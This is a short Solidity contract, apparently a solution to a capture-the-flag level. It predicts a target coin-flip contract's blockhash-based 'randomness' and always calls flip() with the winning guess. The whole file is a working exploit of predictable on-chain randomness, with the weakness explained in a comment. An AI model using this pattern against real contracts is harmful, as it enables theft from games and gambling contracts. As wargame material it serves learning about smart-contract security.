pragma solidity ^0.8;

// Create an interface to interact with flip function in the contract
interface CoinFlip {
	function flip(bool _guess) external returns (bool);
}

contract expl {
	CoinFlip public cf_contract = CoinFlip(0x293DCCf2B321051F20e1D020EbaA6Ff4a49e465A);

	uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

	function pwn(bool _guess) public payable {
		uint256 block_value = uint256(blockhash(block.number - 1)); // The vulnerability is you can create a contract 
                uint256 coin_flip = block_value / FACTOR;                   // that uses the blockhash to generate the
                                                                            // same random number that the contract will
		bool side = coin_flip == 1 ? true : false;

		if(side == _guess) {
			cf_contract.flip(_guess);
		} else {
			cf_contract.flip(!_guess);
		}
	}
}
